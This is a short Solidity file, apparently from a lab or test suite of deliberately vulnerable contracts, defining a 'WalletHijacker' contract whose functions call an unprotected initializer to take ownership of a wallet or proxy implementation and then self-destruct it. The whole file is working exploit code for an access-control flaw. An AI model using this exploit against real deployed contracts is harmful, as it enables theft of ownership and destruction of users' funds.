// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {VulnerableWallet, VulnerableProxyImpl} from "../vulnerable/AccessControl.sol";

contract WalletHijacker {
    function pwn(VulnerableWallet wallet) external {
        wallet.initWallet(address(this));
        wallet.kill();
    }

    function takeoverImpl(VulnerableProxyImpl impl) external {
        impl.init(address(this));
        impl.selfDestructIt();
    }
}
